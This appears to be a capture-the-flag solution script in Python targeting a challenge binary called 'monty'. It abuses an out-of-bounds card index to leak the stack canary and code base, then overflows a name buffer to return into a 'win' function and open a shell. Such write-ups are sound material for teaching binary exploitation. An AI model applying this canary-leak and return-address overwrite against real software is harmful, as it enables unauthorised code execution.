"""
Leak canary and stack addr because of out of index of `cards`.

```
#define DECK_SIZE 0x52
...

    long cards[52] = {0};
...
    printf("index of your first peek? ");
    scanf("%d", &index);
    leak = cards[index % DECK_SIZE];
    cards[index % DECK_SIZE] = cards[0];
    cards[0] = leak;
    printf("Peek 1: %lu\n", cards[0]);
```

Note: SHOULD use Docker for binary debug.
"""

from ptrlib import *

file = "./monty"
e = ELF(file)
#sock = Process(file)
sock = Socket("nc localhost 5000")
#sock.debug = True

# Leak canary
sock.sendlineafter("peek? ", "55")
sock.recvuntil("Peek 1: ")
canary = int(sock.recvline())
logger.info(f"{canary:x}")


# Leak stack
sock.sendlineafter("peek? ", "57")
sock.recvuntil("Peek 2: ")
addr_main48 = int(sock.recvline())
e.base = addr_main48 - 0x167e

logger.info(f'addr win: {e.symbol("win"):x}')
sock.sendline("1")

payload = b"A"*24
payload += flat([
    canary,
    canary,
    e.symbol("win")
], map=p64)

sock.sendlineafter("Name: ", payload)
sock.sh()

